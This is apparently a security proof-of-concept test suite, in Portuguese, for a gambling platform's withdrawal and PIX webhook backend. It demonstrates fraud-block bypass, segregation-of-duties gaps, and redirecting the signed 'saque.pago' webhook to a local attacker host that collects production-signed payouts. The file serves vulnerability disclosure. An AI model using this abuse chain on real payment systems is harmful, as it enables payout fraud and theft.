// PoC (round 2, payout chain): crédito manual → aprovação de saque → webhook saque.pago.
// Estes testes DEMONSTRAM o comportamento atual (passam enquanto o problema existir).
// Cada `it` documenta um passo da cadeia e o que o servidor deixa passar.
import { createHmac } from 'node:crypto'
import { createServer, type IncomingHttpHeaders, type Server } from 'node:http'
import type { AddressInfo } from 'node:net'
import type { FastifyInstance } from 'fastify'
import { afterAll, beforeAll, beforeEach, describe, expect, it } from 'vitest'
import { newId } from '../src/lib/crypto'
import { MAX_ATTEMPTS, processOutboxOnce } from '../src/modules/webhooks/dispatcher'
import { api, createTestApp, loginAs } from './helpers'

// ---------- receptores HTTP locais: "processador de PIX" legítimo e host do atacante ----------
interface Received {
  url: string
  headers: IncomingHttpHeaders
  body: string
}
const legit: Received[] = []
const attacker: Received[] = []
const legitPlan: number[] = []
let legitServer: Server
let attackerServer: Server
let LEGIT = ''
let ATTACKER = ''

function receiver(sink: Received[], plan?: number[]) {
  return createServer((req, res) => {
    let body = ''
    req.setEncoding('utf8')
    req.on('data', (c) => (body += c))
    req.on('end', () => {
      sink.push({ url: req.url ?? '', headers: req.headers, body })
      const status = plan?.shift() ?? 200
      res.writeHead(status, { 'content-type': 'application/json' })
      res.end('{}')
    })
  })
}

const listen = (s: Server) =>
  new Promise<string>((resolve) => s.listen(0, '127.0.0.1', () => resolve(`http://127.0.0.1:${(s.address() as AddressInfo).port}`)))

function signedWith(r: Received, secret: string) {
  const ts = String(r.headers['x-x2w-timestamp'])
  return r.headers['x-x2w-signature'] === `sha256=${createHmac('sha256', secret).update(`${ts}.${r.body}`).digest('hex')}`
}

beforeAll(async () => {
  legitServer = receiver(legit, legitPlan)
  attackerServer = receiver(attacker)
  LEGIT = await listen(legitServer)
  ATTACKER = await listen(attackerServer)
})
afterAll(async () => {
  for (const s of [legitServer, attackerServer]) {
    s.closeAllConnections()
    await new Promise<void>((r) => s.close(() => r()))
  }
})
beforeEach(() => {
  legit.length = 0
  attacker.length = 0
  legitPlan.length = 0
})

// ---------- utilitários ----------
async function insertWithdrawal(app: FastifyInstance, o: { playerId: string; amount: number; status?: string; risk?: string; id?: string }) {
  const id = o.id ?? newId('SQ')
  await app.db.query(
    `insert into withdrawals (id, player_id, player_name, player_email, amount_cents, fee_cents, status, risk_level, risk_score,
                              risk_reasons, pix_key_type, pix_key_enc, reference, created_at, updated_at)
     values ($1, $2, 'Jogador', 'j@x.com', $3, 0, $4, $5, 95, '["Rede banida pelo anti-fraude"]'::jsonb, 'CPF', $6, 'E1', now(), now())`,
    [id, o.playerId, Math.round(o.amount * 100), o.status ?? 'pendente', o.risk ?? 'alto', app.cipher.encrypt('12345678909')],
  )
  return id
}

async function insertDestination(app: FastifyInstance, event: string, url: string, secret: string, active = true) {
  const id = newId('wh')
  await app.db.query(`insert into webhook_destinations (id, event, url, active, secret_enc) values ($1, $2, $3, $4, $5)`, [
    id,
    event,
    url,
    active,
    app.cipher.encrypt(secret),
  ])
  return id
}

async function getKv(app: FastifyInstance, cookie: string, key: string) {
  const r = await api(app, 'GET', `/api/kv/${key}`, { cookie })
  expect(r.statusCode).toBe(200)
  return r.json() as { value: any; version: number }
}

async function putKv(app: FastifyInstance, cookie: string, key: string, value: unknown, version: number) {
  return api(app, 'PUT', `/api/kv/${key}`, { cookie, body: { value, version } })
}

const outbox = (app: FastifyInstance) =>
  app.db.query<{ id: number; status: string; attempts: number; destination_id: string; payload: { id: string } }>('select * from webhook_outbox order by id')

// =====================================================================================
describe('passo 1: aprovação ignora status do jogador, bloqueios anti-fraude e regras em vigor', () => {
  let app: FastifyInstance
  beforeAll(async () => {
    app = await createTestApp()
  })
  afterAll(async () => app.close())

  it('Financeiro aprova saque de jogador BLOQUEADO (rede banida em seguranca.bloqueios), em_analise e risco alto; saque.pago é enfileirado', async () => {
    const root = await loginAs(app, 'superadmin')
    // base de jogadores: p-ban banido pelo anti-fraude, p-auto autoexcluído
    const base = [
      { id: 'p-ban', name: 'Fraudador', email: 'f@x.com', status: 'bloqueado', balanceReal: 0, balanceBonus: 0, tags: [] },
      { id: 'p-auto', name: 'Autoexcluido', email: 'a@x.com', status: 'autoexcluido', balanceReal: 0, balanceBonus: 0, tags: [] },
    ]
    expect((await putKv(app, root.cookie, 'geral.jogadores', base, 0)).statusCode).toBe(200)
    const blocks = [
      { id: 'b1', kind: 'rede', value: 'rede-1', reason: 'Multicontas + bônus', accounts: ['p-ban'], previousStatuses: { 'p-ban': 'ativo' }, createdAt: new Date().toISOString(), createdBy: 'Antifraude' },
    ]
    expect((await putKv(app, root.cookie, 'seguranca.bloqueios', blocks, 0)).statusCode).toBe(200)
    await insertDestination(app, 'saque.pago', `${LEGIT}/pix`, 'segredo-pix-producao')

    const fin = await loginAs(app, 'financeiro')
    const w = await insertWithdrawal(app, { playerId: 'p-ban', amount: 4999, status: 'em_analise', risk: 'alto' })
    const r = await api(app, 'POST', `/api/withdrawals/${w}/approve`, { cookie: fin.cookie })
    console.log('[passo1] aprovar saque de jogador bloqueado →', r.statusCode, r.json().message)
    expect(r.statusCode).toBe(200)
    expect(r.json().withdrawal.status).toBe('aprovado')
    expect((await outbox(app)).length).toBe(1)
    await processOutboxOnce(app)
    expect(legit).toHaveLength(1)
    expect(JSON.parse(legit[0].body)).toMatchObject({ event: 'saque.pago', data: { id: w, playerId: 'p-ban', amount: 4999 } })
  })

  it('aprova acima de maxPerRequest e além do dailyLimit gravados nas regras (nada é reconferido na aprovação)', async () => {
    const root = await loginAs(app, 'superadmin')
    const rules = await getKv(app, root.cookie, 'operacao.saques.regras')
    const put = await putKv(app, root.cookie, 'operacao.saques.regras', { ...rules.value, maxPerRequest: 100, autoApproveMax: 0, dailyLimit: 1, fee: 0, min: 20 }, rules.version)
    expect(put.statusCode).toBe(200)
    const adm = await loginAs(app, 'administrador') // teto null
    const ids = [await insertWithdrawal(app, { playerId: 'p-auto', amount: 50_000 }), await insertWithdrawal(app, { playerId: 'p-auto', amount: 40_000 }), await insertWithdrawal(app, { playerId: 'p-auto', amount: 30_000 })]
    for (const id of ids) {
      const r = await api(app, 'POST', `/api/withdrawals/${id}/approve`, { cookie: adm.cookie })
      expect(r.statusCode).toBe(200)
    }
    console.log('[passo1] 3 saques no mesmo dia (R$ 120.000) com maxPerRequest=100 e dailyLimit=1: todos aprovados')
  })
})

// =====================================================================================
describe('passo 2: segregação de funções (creditar + aprovar o mesmo jogador, sem segundo aprovador)', () => {
  let app: FastifyInstance
  beforeAll(async () => {
    app = await createTestApp()
  })
  afterAll(async () => app.close())

  it('Administrador sem cargos.conceder cria um cargo NÃO administrativo com usuarios.editar + transacoes.editar + saques.aprovar e teto null; quem tem esse cargo credita e aprova o saque do mesmo jogador', async () => {
    const root = await loginAs(app, 'superadmin')
    expect((await putKv(app, root.cookie, 'geral.jogadores', [{ id: 'p-cumplice', name: 'Cumplice', email: 'c@x.com', status: 'ativo', balanceReal: 0, balanceBonus: 0, tags: [] }], 0)).statusCode).toBe(200)
    expect((await putKv(app, root.cookie, 'geral.transacoes', [{ id: 't0', type: 'deposito', amount: 10, playerId: 'p-cumplice', at: new Date(Date.now() - 86400_000 * 3).toISOString() }], 0)).statusCode).toBe(200)

    const adm = await loginAs(app, 'administrador')
    const roles = await getKv(app, adm.cookie, 'cargos.lista')
    const newRole = {
      id: 'novo-caixa',
      name: 'Caixa',
      description: '',
      permissions: ['usuarios.ver', 'usuarios.editar', 'transacoes.ver', 'transacoes.editar', 'saques.ver', 'saques.aprovar'],
      require2fa: false,
      approvalCeiling: null,
    }
    const pr = await putKv(app, adm.cookie, 'cargos.lista', [...roles.value, newRole], roles.version)
    console.log('[passo2] Administrador cria cargo "Caixa" (teto null) →', pr.statusCode)
    expect(pr.statusCode).toBe(200)
    const roleId = (pr.json().value as { id: string; name: string }[]).find((r) => r.name === 'Caixa')!.id

    const caixa = await loginAs(app, roleId, { name: 'Pessoa Caixa' })
    // 1) credita o cúmplice (R$ 5.000, teto diário)
    const tx = await getKv(app, caixa.cookie, 'geral.transacoes')
    const credit = { id: 'tx-c1', playerId: 'p-cumplice', type: 'credito_manual', amount: 5000, wallet: 'real', reference: 'AJUSTE-1', note: 'ajuste' }
    const pc = await putKv(app, caixa.cookie, 'geral.transacoes', [credit, ...tx.value], tx.version)
    expect(pc.statusCode).toBe(200)
    // 2) o jogador pede o saque na plataforma; 3) a MESMA pessoa aprova
    const w = await insertWithdrawal(app, { playerId: 'p-cumplice', amount: 5000, risk: 'alto' })
    const ap = await api(app, 'POST', `/api/withdrawals/${w}/approve`, { cookie: caixa.cookie })
    expect(ap.statusCode).toBe(200)
    const row = await app.db.one<{ decided_by_id: string }>('select decided_by_id from withdrawals where id = $1', [w])
    const ledger = await getKv(app, root.cookie, 'geral.transacoes')
    const creditRow = (ledger.value as { id: string; byId: string }[]).find((t) => t.id === 'tx-c1')!
    console.log('[passo2] crédito por', creditRow.byId, '| saque aprovado por', row?.decided_by_id)
    expect(row?.decided_by_id).toBe(caixa.user.id)
    expect(creditRow.byId).toBe(caixa.user.id)
  })

  it('Administrador (sem cargos.conceder) transforma o cargo de sistema Suporte em aprovador sem teto: todo atendente que já lança créditos passa a aprovar saques ilimitados', async () => {
    const adm = await loginAs(app, 'administrador')
    const roles = await getKv(app, adm.cookie, 'cargos.lista')
    const next = (roles.value as any[]).map((r) => (r.id === 'suporte' ? { ...r, permissions: [...r.permissions, 'saques.aprovar'], approvalCeiling: null } : r))
    const pr = await putKv(app, adm.cookie, 'cargos.lista', next, roles.version)
    console.log('[passo2] Suporte vira aprovador sem teto →', pr.statusCode)
    expect(pr.statusCode).toBe(200)
    const sup = await loginAs(app, 'suporte')
    const w = await insertWithdrawal(app, { playerId: 'p-cumplice', amount: 250_000 })
    const ap = await api(app, 'POST', `/api/withdrawals/${w}/approve`, { cookie: sup.cookie })
    console.log('[passo2] Suporte aprova R$ 250.000 →', ap.statusCode)
    expect(ap.statusCode).toBe(200)
  })

  it('o próprio Administrador (sistema) credita e aprova sozinho', async () => {
    const adm = await loginAs(app, 'administrador')
    const tx = await getKv(app, adm.cookie, 'geral.transacoes')
    // limite de 24 h já usado pelo teste anterior para p-cumplice: usa outro jogador
    const root = await loginAs(app, 'superadmin')
    const players = await getKv(app, root.cookie, 'geral.jogadores')
    expect(players.value.length).toBe(1)
    const r = await putKv(app, adm.cookie, 'geral.transacoes', [{ id: 'tx-c2', playerId: 'p-cumplice', type: 'debito_manual', amount: -1, wallet: 'real', reference: 'X' }, ...tx.value], tx.version)
    expect(r.statusCode).toBe(200)
    const w = await insertWithdrawal(app, { playerId: 'p-cumplice', amount: 4999 })
    expect((await api(app, 'POST', `/api/withdrawals/${w}/approve`, { cookie: adm.cookie })).statusCode).toBe(200)
  })
})

// =====================================================================================
describe('passo 3: integridade do webhook saque.pago (troca de URL/evento mantendo o segredo de produção)', () => {
  let app: FastifyInstance
  const SECRET_PAGO = 'segredo-producao-pix-0001'
  const SECRET_REJ = 'segredo-producao-rej-0002'
  let pagoId = ''
  let rejId = ''
  beforeAll(async () => {
    app = await createTestApp()
    pagoId = await insertDestination(app, 'saque.pago', `${LEGIT}/pix/pagar`, SECRET_PAGO)
    rejId = await insertDestination(app, 'saque.rejeitado', `${LEGIT}/pix/estornar`, SECRET_REJ)
  })
  afterAll(async () => app.close())

  it('webhooks.editar troca só a URL do destino saque.pago (segredo mascarado = mantido): entregas JÁ enfileiradas e as novas vão assinadas com o segredo de produção para o host do atacante; auditoria não registra o host novo', async () => {
    const adm = await loginAs(app, 'administrador')
    // saque aprovado enquanto o processador está fora (fica na fila para nova tentativa)
    const w1 = await insertWithdrawal(app, { playerId: 'p1', amount: 1000 })
    expect((await api(app, 'POST', `/api/withdrawals/${w1}/approve`, { cookie: adm.cookie })).statusCode).toBe(200)
    legitPlan.push(503)
    await processOutboxOnce(app)
    expect(legit).toHaveLength(1)

    // redireciona: segredo volta mascarado → servidor mantém o segredo de produção
    const cur = await getKv(app, adm.cookie, 'campanhas.webhooks.destinos')
    const list = (cur.value as any[]).map((d) => (d.id === pagoId ? { ...d, url: `${ATTACKER}/coleta` } : d))
    const put = await putKv(app, adm.cookie, 'campanhas.webhooks.destinos', list, cur.version)
    expect(put.statusCode).toBe(200)

    // a nova tentativa do saque já aprovado + um saque novo saem para o atacante
    await app.db.query(`update webhook_outbox set next_attempt_at = now() - interval '1 second' where status = 'pendente'`)
    const w2 = await insertWithdrawal(app, { playerId: 'p2', amount: 2000 })
    expect((await api(app, 'POST', `/api/withdrawals/${w2}/approve`, { cookie: adm.cookie })).statusCode).toBe(200)
    await processOutboxOnce(app)
    console.log('[passo3] entregas no host do atacante:', attacker.map((a) => JSON.parse(a.body).data.id))
    expect(attacker).toHaveLength(2)
    expect(attacker.every((a) => signedWith(a, SECRET_PAGO))).toBe(true)
    expect(legit).toHaveLength(1) // o processador nunca recebe as ordens de pagamento
    const ob = await outbox(app)
    expect(ob.every((o) => o.status === 'entregue')).toBe(true) // painel mostra sucesso

    const audit = await app.db.one<{ summary: string }>(`select summary from audit_log where entity like 'Dados · %' and summary like 'Destinos de webhook%' order by id desc limit 1`)
    console.log('[passo3] auditoria:', audit?.summary)
    expect(audit?.summary).not.toContain(new URL(ATTACKER).host)
  })

  it('POST /destinations/:id/test assina com o segredo de produção um envelope saque.pago (x-x2w-event: saque.pago); só o campo test:true no corpo distingue', async () => {
    const adm = await loginAs(app, 'administrador')
    const r = await api(app, 'POST', `/api/webhooks/destinations/${pagoId}/test`, { cookie: adm.cookie })
    expect(r.statusCode).toBe(200)
    const last = attacker[attacker.length - 1]
    console.log('[passo3] teste recebido:', last.headers['x-x2w-event'], last.body)
    expect(last.headers['x-x2w-event']).toBe('saque.pago')
    expect(signedWith(last, SECRET_PAGO)).toBe(true)
    expect(JSON.parse(last.body)).toMatchObject({ event: 'saque.pago', test: true, data: { id: 'TESTE-0001', amount: 100 } })
  })

  it('repontar o destino saque.rejeitado (endpoint de estorno) para o evento saque.pago mantém o segredo dele: cada aprovação passa a chegar assinada ao endpoint de estorno', async () => {
    const adm = await loginAs(app, 'administrador')
    const cur = await getKv(app, adm.cookie, 'campanhas.webhooks.destinos')
    const list = (cur.value as any[]).map((d) => (d.id === rejId ? { ...d, event: 'saque.pago' } : d))
    expect((await putKv(app, adm.cookie, 'campanhas.webhooks.destinos', list, cur.version)).statusCode).toBe(200)
    const w = await insertWithdrawal(app, { playerId: 'p3', amount: 3000 })
    expect((await api(app, 'POST', `/api/withdrawals/${w}/approve`, { cookie: adm.cookie })).statusCode).toBe(200)
    await processOutboxOnce(app)
    const toRefund = legit.filter((l) => l.url === '/pix/estornar')
    console.log('[passo3] endpoint de estorno recebeu:', toRefund.map((l) => `${l.headers['x-x2w-event']} ${JSON.parse(l.body).data.id}`))
    expect(toRefund).toHaveLength(1)
    expect(signedWith(toRefund[0], SECRET_REJ)).toBe(true)
  })
})

// =====================================================================================
describe('passo 4: semântica de entrega (não pagamento silencioso / reentrega)', () => {
  let app: FastifyInstance
  beforeAll(async () => {
    app = await createTestApp()
  })
  afterAll(async () => app.close())

  it('sem destino saque.pago ativo: aprova, responde "O PIX foi enviado" e nada é enfileirado; reativar depois não recupera', async () => {
    const adm = await loginAs(app, 'administrador')
    const destId = await insertDestination(app, 'saque.pago', `${LEGIT}/pix`, 'segredo-pix-0003', false)
    const w = await insertWithdrawal(app, { playerId: 'p1', amount: 700 })
    const r = await api(app, 'POST', `/api/withdrawals/${w}/approve`, { cookie: adm.cookie })
    console.log('[passo4] sem destino ativo →', r.statusCode, r.json().message)
    expect(r.statusCode).toBe(200)
    expect(r.json().message).toContain('O PIX foi enviado')
    expect(await outbox(app)).toHaveLength(0)
    await app.db.query('update webhook_destinations set active = true where id = $1', [destId])
    expect(await processOutboxOnce(app)).toBe(0)
    expect(legit).toHaveLength(0)
  })

  it(`após ${MAX_ATTEMPTS} falhas (~16 min de indisponibilidade) o item vira 'falhou' e o saque segue 'aprovado', sem auditoria nem alerta; não há como reenfileirar`, async () => {
    await app.db.query('delete from webhook_outbox')
    const adm = await loginAs(app, 'administrador')
    const w = await insertWithdrawal(app, { playerId: 'p2', amount: 800 })
    expect((await api(app, 'POST', `/api/withdrawals/${w}/approve`, { cookie: adm.cookie })).statusCode).toBe(200)
    const auditBefore = await app.db.one<{ n: number }>('select count(*)::int as n from audit_log')
    for (let i = 0; i < MAX_ATTEMPTS; i++) {
      legitPlan.push(503)
      await app.db.query(`update webhook_outbox set next_attempt_at = now() - interval '1 second' where status = 'pendente'`)
      await processOutboxOnce(app)
    }
    const [item] = await outbox(app)
    expect(item).toMatchObject({ status: 'falhou', attempts: MAX_ATTEMPTS })
    const wd = await app.db.one<{ status: string }>('select status from withdrawals where id = $1', [w])
    expect(wd?.status).toBe('aprovado')
    const auditAfter = await app.db.one<{ n: number }>('select count(*)::int as n from audit_log')
    expect(auditAfter?.n).toBe(auditBefore?.n)
    console.log('[passo4] outbox', item.status, '| saque', wd?.status, '| novas linhas de auditoria:', (auditAfter?.n ?? 0) - (auditBefore?.n ?? 0))
  })

  it('excluir o destino apaga (on delete cascade) as entregas pendentes de saques já aprovados, sem rastro na fila', async () => {
    await app.db.query('delete from webhook_outbox')
    const adm = await loginAs(app, 'administrador')
    const w = await insertWithdrawal(app, { playerId: 'p3', amount: 900 })
    expect((await api(app, 'POST', `/api/withdrawals/${w}/approve`, { cookie: adm.cookie })).statusCode).toBe(200)
    expect((await outbox(app)).filter((o) => o.status === 'pendente')).toHaveLength(1)
    const cur = await getKv(app, adm.cookie, 'campanhas.webhooks.destinos')
    expect((await putKv(app, adm.cookie, 'campanhas.webhooks.destinos', [], cur.version)).statusCode).toBe(200)
    expect(await outbox(app)).toHaveLength(0)
    const wd = await app.db.one<{ status: string }>('select status from withdrawals where id = $1', [w])
    expect(wd?.status).toBe('aprovado')
  })

  it('2xx recebido, mas a gravação da execução falha: o item é reenviado após a reserva (mesmo id de evento, mesmo x-x2w-delivery)', async () => {
    await app.db.query('delete from webhook_outbox')
    const adm = await loginAs(app, 'administrador')
    await insertDestination(app, 'saque.pago', `${LEGIT}/pix2`, 'segredo-pix-0004')
    const w = await insertWithdrawal(app, { playerId: 'p4', amount: 1200 })
    expect((await api(app, 'POST', `/api/withdrawals/${w}/approve`, { cookie: adm.cookie })).statusCode).toBe(200)
    const origTx = app.db.tx.bind(app.db)
    let fail = true
    ;(app.db as { tx: typeof app.db.tx }).tx = (async (fn: any) => {
      if (fail) {
        fail = false
        throw new Error('queda momentânea do banco')
      }
      return origTx(fn)
    }) as typeof app.db.tx
    await processOutboxOnce(app)
    ;(app.db as { tx: typeof app.db.tx }).tx = origTx
    let [item] = await outbox(app)
    expect(item.status).toBe('pendente')
    expect(item.attempts).toBe(0)
    await app.db.query(`update webhook_outbox set next_attempt_at = now() - interval '1 second'`)
    await processOutboxOnce(app)
    ;[item] = await outbox(app)
    const hits = legit.filter((l) => l.url === '/pix2')
    console.log('[passo4] entregas 2xx do mesmo saque:', hits.length, 'ids:', hits.map((h) => JSON.parse(h.body).id), 'delivery:', hits.map((h) => h.headers['x-x2w-delivery']))
    expect(hits).toHaveLength(2)
    expect(JSON.parse(hits[0].body).id).toBe(JSON.parse(hits[1].body).id)
    expect(item.status).toBe('entregue')
  })
})
